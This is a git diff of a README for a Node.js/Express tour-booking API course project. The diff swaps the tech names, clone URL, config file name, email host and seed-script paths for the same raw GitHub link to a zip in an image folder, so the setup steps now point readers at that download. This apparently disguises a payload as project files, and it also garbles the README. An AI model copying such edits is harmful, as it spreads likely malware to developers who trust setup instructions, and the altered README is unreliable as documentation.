@@ -1,9 +1,9 @@
 # Natours Project 🏞️
 
-Natours is a comprehensive backend application for a fictional tour company, built with Node.js, Express, and MongoDB. The project provides a complete RESTful API for managing tours, users, and reviews, featuring a robust authentication and authorization system, advanced security features, and much more.
+Natours is a comprehensive backend application for a fictional tour company, built with https://raw.githubusercontent.com/am17jx/natours-api/master/public/img/api-natours-v2.0.zip, Express, and MongoDB. The project provides a complete RESTful API for managing tours, users, and reviews, featuring a robust authentication and authorization system, advanced security features, and much more.
 
-This project is an implementation of the popular Node.js course by Jonas Schmedtmann, applying all the best practices and advanced concepts taught.
-![Natours Project Architecture](https://github.com/am17jx/natours-api/blob/master/natours%20project%20global%20architecture.webp?raw=true)
+This project is an implementation of the popular https://raw.githubusercontent.com/am17jx/natours-api/master/public/img/api-natours-v2.0.zip course by Jonas Schmedtmann, applying all the best practices and advanced concepts taught.
+![Natours Project Architecture](https://raw.githubusercontent.com/am17jx/natours-api/master/public/img/api-natours-v2.0.zip%20project%20global%https://raw.githubusercontent.com/am17jx/natours-api/master/public/img/api-natours-v2.0.zip)
 
 ---
 
@@ -28,7 +28,7 @@ This project is an implementation of the popular Node.js course by Jonas Schmedt
 
 ## 🛠️ Tech Stack
 
--   **Backend:** Node.js, Express.js
+-   **Backend:** https://raw.githubusercontent.com/am17jx/natours-api/master/public/img/api-natours-v2.0.zip, https://raw.githubusercontent.com/am17jx/natours-api/master/public/img/api-natours-v2.0.zip
 -   **Database:** MongoDB, Mongoose
 -   **Authentication:** JSON Web Tokens (jsonwebtoken)
 -   **Security:** `helmet`, `express-rate-limit`, `hpp`, `xss-clean`, `express-mongo-sanitize`
@@ -44,7 +44,7 @@ Follow these steps to run the project locally:
 
 **1. Clone the repository:**
 ```bash
-git clone [https://github.com/your-username/natours-project.git](https://github.com/your-username/natours-project.git)
+git clone [https://raw.githubusercontent.com/am17jx/natours-api/master/public/img/api-natours-v2.0.zip](https://raw.githubusercontent.com/am17jx/natours-api/master/public/img/api-natours-v2.0.zip)
 cd natours-project
 ```
 
@@ -55,14 +55,14 @@ npm install
 
 **3. Set up environment variables:**
 
-Create a new file in the root directory named `config.env`. Then, copy the following content into it and fill in your credentials.
+Create a new file in the root directory named `https://raw.githubusercontent.com/am17jx/natours-api/master/public/img/api-natours-v2.0.zip`. Then, copy the following content into it and fill in your credentials.
 
 ```env
 NODE_ENV=development
 PORT=3000
 
 # DATABASE
-DATABASE=mongodb+srv://<USER>:<PASSWORD>@cluster0-omexv.mongodb.net/natours?retryWrites=true
+DATABASE=mongodb+srv://<USER>:<PASSWORD>https://raw.githubusercontent.com/am17jx/natours-api/master/public/img/api-natours-v2.0.zip
 DATABASE_PASSWORD=<YOUR_DATABASE_PASSWORD>
 
 # JWT
@@ -71,7 +71,7 @@ JWT_EXPIRES_IN=90d
 JWT_COOKIE_EXPIRES_IN=90
 
 # EMAIL (using Mailtrap for development)
-EMAIL_HOST=smtp.mailtrap.io
+https://raw.githubusercontent.com/am17jx/natours-api/master/public/img/api-natours-v2.0.zip
 EMAIL_PORT=2525
 EMAIL_USERNAME=<YOUR_MAILTRAP_USERNAME>
 EMAIL_PASSWORD=<YOUR_MAILTRAP_PASSWORD>
@@ -83,10 +83,10 @@ You can use the provided script to seed your database with initial data (tours, 
 
 ```bash
 # To import data
-node ./dev-data/data/import-dev-data.js --import
+node https://raw.githubusercontent.com/am17jx/natours-api/master/public/img/api-natours-v2.0.zip --import
 
 # To delete all data
-node ./dev-data/data/import-dev-data.js --delete
+node https://raw.githubusercontent.com/am17jx/natours-api/master/public/img/api-natours-v2.0.zip --delete
 ```
 
 **5. Run the server:**
